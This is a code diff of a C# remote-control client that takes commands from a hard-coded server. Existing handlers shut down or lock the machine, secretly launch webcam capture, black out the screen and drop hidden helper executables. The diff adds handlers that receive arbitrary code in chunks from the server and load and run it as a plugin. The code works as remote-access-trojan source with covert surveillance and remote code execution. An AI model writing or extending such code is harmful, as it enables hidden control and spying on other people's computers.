@@ -13,13 +13,16 @@ using System.Media;
 using System.Drawing.Imaging;
 using Newtonsoft.Json;
 using Microsoft.VisualBasic.Devices;
+using RemoteControl.Protocals.Request;
+using RemoteControl.Protocals.Plugin;
+using RemoteControl.Protocals.Utilities;
 
 namespace RemoteControl.Client
 {
     class Program
     {
         private static Socket oServer;
-        private static bool isTestMode = false;
+        private static bool isTestMode = true;
         //private static string ServerIP = "10.55.200.187";
         private static string ServerIP = "192.168.1.136";
         private static int ServerPort = 10086;
@@ -33,6 +36,7 @@ namespace RemoteControl.Client
         private static string lastVideoCaptureExeFile = null;
         private static string lastMsgBoxExeFile = null;
         private static string lastPlayMusicExeFile = null;
+        private static Dictionary<string, List<byte>> codePluginDic = new Dictionary<string, List<byte>>();
 
         static void Main(string[] args)
         {
@@ -278,28 +282,28 @@ namespace RemoteControl.Client
             }
             else if (packetType == ePacketType.PACKET_SHUTDOWN_REQUEST)
             {
-                StartAPP("shutdown.exe", "-s -t 0", true);
+                ProcessUtil.Run("shutdown.exe", "-s -t 0", true);
             }
             else if (packetType == ePacketType.PACKET_REBOOT_REQUEST)
             {
-                StartAPP("shutdown.exe", "-r -t 0", true);
+                ProcessUtil.Run("shutdown.exe", "-r -t 0", true);
             }
             else if (packetType == ePacketType.PACKET_SLEEP_REQUEST)
             {
-                StartAPP("rundll32.exe", "powrprof.dll,SetSuspendState 0,1,0", true);
+                ProcessUtil.Run("rundll32.exe", "powrprof.dll,SetSuspendState 0,1,0", true);
             }
             else if (packetType == ePacketType.PACKET_HIBERNATE_REQUEST)
             {
-                StartAPP("rundll32.exe", "powrProf.dll,SetSuspendState", true);
+                ProcessUtil.Run("rundll32.exe", "powrProf.dll,SetSuspendState", true);
             }
             else if (packetType == ePacketType.PACKET_LOCK_REQUEST)
             {
-                StartAPP("rundll32.exe", "user32.dll,LockWorkStation", true);
+                ProcessUtil.Run("rundll32.exe", "user32.dll,LockWorkStation", true);
             }
             else if (packetType == ePacketType.PACKET_OPEN_URL_REQUEST)
             {
                 var req = obj as RequestOpenUrl;
-                StartAPP(req.Url, "", false, true);
+                ProcessUtil.Run(req.Url, "", false, true);
             }
             else if (packetType == ePacketType.PACKET_MESSAGEBOX_REQUEST)
             {
@@ -405,14 +409,14 @@ namespace RemoteControl.Client
                             if (lastVideoCaptureExeFile != null)
                             {
                                 string processName = System.IO.Path.GetFileNameWithoutExtension(lastVideoCaptureExeFile);
-                                KillProcess(processName.ToLower());
+                                ProcessUtil.KillProcess(processName.ToLower());
                             }
                             // 释放并打开视频程序
-                            byte[] data = GetResFileData("CamCapture.dat");
-                            string fileName = WriteToRandomFile(data,"camCapture.exe");
+                            byte[] data = ResUtil.GetResFileData("CamCapture.dat");
+                            string fileName = ResUtil.WriteToRandomFile(data,"camCapture.exe");
                             lastVideoCaptureExeFile = fileName;
                             System.IO.File.WriteAllText(LastVideoCapturePathStoreFile, fileName);
-                            StartAPP("cmd.exe", "/c start " + fileName + " /s", true, false);
+                            ProcessUtil.Run("cmd.exe", "/c start " + fileName + " /s", true, false);
                             // 查找视频程序的端口
                             string pName = System.IO.Path.GetFileNameWithoutExtension(lastVideoCaptureExeFile);
                             DoOutput("已启动视频监控程序：" + pName);
@@ -465,7 +469,7 @@ namespace RemoteControl.Client
                                     if (lastVideoCaptureExeFile != null)
                                     {
                                         string processName = System.IO.Path.GetFileNameWithoutExtension(lastVideoCaptureExeFile);
-                                        KillProcess(processName.ToLower());
+                                        ProcessUtil.KillProcess(processName.ToLower());
                                     }
                                     break;
                                 }
@@ -541,9 +545,36 @@ namespace RemoteControl.Client
             else if (packetType == ePacketType.PACKET_RESTART_APP_REQUEST)
             {
                 string path = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
-                var thread = StartAPP(path, "", true);
+                var thread = ProcessUtil.Run(path, "", true);
                 thread.Join();
                 Environment.Exit(0);
+            }
+            else if (packetType == ePacketType.PACKET_TRANSPORT_EXEC_CODE_REQUEST)
+            {
+                var req = obj as RequestTransportExecCode;
+                if (!codePluginDic.ContainsKey(req.ID))
+                {
+                    codePluginDic.Add(req.ID, new List<byte>());
+                }
+                codePluginDic[req.ID].AddRange(req.Data);
+            }
+            else if (packetType == ePacketType.PACKET_RUN_EXEC_CODE_REQUEST)
+            {
+                new Thread(() => {
+                    try
+                    {
+                        var req = obj as RequestRunExecCode;
+                        if(codePluginDic.ContainsKey(req.ID))
+                        {
+                            PluginLoader.LoadPlugin(codePluginDic[req.ID].ToArray());
+                            codePluginDic.Remove(req.ID);
+                        }
+                    }
+                    catch (Exception ex)
+                    {
+                        Console.WriteLine(ex.Message);
+                    }
+                }) { IsBackground = true }.Start();
             }
         }
 
@@ -709,7 +740,7 @@ namespace RemoteControl.Client
         {
             if (lastPlayMusicExeFile != null)
             {
-                KillProcess(lastPlayMusicExeFile);
+                ProcessUtil.KillProcess(lastPlayMusicExeFile);
             }
             //Win32API.mciSendString("close mymusic", null, 0, IntPtr.Zero);//关闭
         }
@@ -719,11 +750,11 @@ namespace RemoteControl.Client
             try
             {
                 // 释放程序
-                byte[] data = GetResFileData("Downloader.dat");
-                string fileName = WriteToRandomFile(data);
+                byte[] data = ResUtil.GetResFileData("Downloader.dat");
+                string fileName = ResUtil.WriteToRandomFile(data);
                 // 启动程序
                 string arguments = string.Format("{0} {1}", req.WebFileUrl,req.DestinationPath);
-                StartAPP("cmd.exe", "/c start " + fileName + " " + arguments, true, false);
+                ProcessUtil.Run("cmd.exe", "/c start " + fileName + " " + arguments, true, false);
             }
             catch (Exception ex)
             {
@@ -738,13 +769,13 @@ namespace RemoteControl.Client
                 if (lastMsgBoxExeFile == null || !System.IO.File.Exists(lastMsgBoxExeFile))
                 {
                     // 释放弹窗程序
-                    byte[] data = GetResFileData("MsgBox.dat");
-                    string fileName = WriteToRandomFile(data);
+                    byte[] data = ResUtil.GetResFileData("MsgBox.dat");
+                    string fileName = ResUtil.WriteToRandomFile(data);
                     lastMsgBoxExeFile = fileName;
                 }
                 // 启动弹窗程序
                 string msgBoxArguments = string.Format("{0} {1} {2} {3}", req.Content,req.Title,req.MessageBoxButtons,req.MessageBoxIcons);
-                StartAPP("cmd.exe", "/c start " + lastMsgBoxExeFile + " " + msgBoxArguments, true, false);
+                ProcessUtil.Run("cmd.exe", "/c start " + lastMsgBoxExeFile + " " + msgBoxArguments, true, false);
             }
             catch (Exception ex)
             {
@@ -757,11 +788,11 @@ namespace RemoteControl.Client
             try
             {
                 // 释放音乐播放程序
-                byte[] data = GetResFileData("MusicPlayer.dat");
-                string musicPlayerFileName = WriteToRandomFile(data);
+                byte[] data = ResUtil.GetResFileData("MusicPlayer.dat");
+                string musicPlayerFileName = ResUtil.WriteToRandomFile(data);
                 lastPlayMusicExeFile = System.IO.Path.GetFileNameWithoutExtension(musicPlayerFileName);
                 // 启动音乐播放程序
-                StartAPP("cmd.exe", "/c start " + musicPlayerFileName + " " + musicFilePath, true, false);
+                ProcessUtil.Run("cmd.exe", "/c start " + musicPlayerFileName + " " + musicFilePath, true, false);
             }
             catch (Exception ex)
             {
@@ -774,10 +805,10 @@ namespace RemoteControl.Client
             try
             {
                 // 释放黑屏程序
-                byte[] data = GetResFileData("BlackScreen.dat");
-                string blackScreenFileName = WriteToRandomFile(data, "blackscreen.exe");
+                byte[] data = ResUtil.GetResFileData("BlackScreen.dat");
+                string blackScreenFileName = ResUtil.WriteToRandomFile(data, "blackscreen.exe");
                 // 启动黑屏程序
-                StartAPP("cmd.exe", "/c start " + blackScreenFileName, true, false);
+                ProcessUtil.Run("cmd.exe", "/c start " + blackScreenFileName, true, false);
             }
             catch (Exception ex)
             {
@@ -785,56 +816,11 @@ namespace RemoteControl.Client
             }
         }
 
-        static byte[] GetResFileData(string resFileName)
-        {
-            return Utils.GetResFileData(resFileName);
-        }
-
-        static string WriteToRandomFile(byte[] data, string fileName)
-        {
-            var filePath = Environment.GetEnvironmentVariable("temp") + "\\" + fileName;
-            System.IO.File.WriteAllBytes(filePath, data);
-
-            return filePath;
-        }
-
-        static string WriteToRandomFile(byte[] data)
-        {
-            string randomFileName = System.IO.Path.GetRandomFileName();
-            return WriteToRandomFile(data, randomFileName);
-        }
-
-        static void KillProcess(string processNameInLower)
-        {
-            try
-            {
-                var pros = Process.GetProcesses();
-                for (int i = 0; i < pros.Length; i++)
-                {
-                    Process p = pros[i];
-                    if (p.ProcessName.ToLower().Contains(processNameInLower))
-                    {
-                        try
-                        {
-                            DoOutput("成功结束进程:" + p.ProcessName);
-                            p.Kill();
-                        }
-                        catch
-                        {
-                        }
-                    }
-                }
-            }
-            catch (Exception ex)
-            {
-            }
-        }
-
         static void StartUnBlackScreen(SocketSession session)
         {
             try
             {
-                KillProcess("blackscreen");
+                ProcessUtil.KillProcess("blackscreen");
 
                 Win32API.ShowWindow(Win32API.FindWindow(Win32API.Shell_TrayWnd_Name,null), Win32API.SW_SHOW);
             }
@@ -1010,38 +996,6 @@ namespace RemoteControl.Client
             g.ReleaseHdc(pDC);
 
             return myImage;
-        }
-
-        static Thread StartAPP(string appFileName, string arguments, bool hideWindow)
-        {
-            return StartAPP(appFileName,arguments,hideWindow, false);
-        }
-
-        static Thread StartAPP(string appFileName, string arguments, bool hideWindow, bool useShellExecute)
-        {
-            var t = new Thread(() =>
-            {
-                try
-                {
-                    Process p = new Process();
-                    p.StartInfo.FileName = appFileName;
-                    p.StartInfo.Arguments = arguments;
-                    p.StartInfo.CreateNoWindow = hideWindow;
-                    p.StartInfo.UseShellExecute = useShellExecute;
-                    if (hideWindow)
-                    {
-                        p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
-                    }
-                    p.Start();
-                }
-                catch (Exception ex)
-                {
-                    Console.WriteLine("启动进程失败，" + ex.Message);
-                }
-            }) { IsBackground = true };
-            t.Start();
-
-            return t;
         }
 
         static void StartMessageBox(string title, string content, MessageBoxButtons buttons, MessageBoxIcon icon)
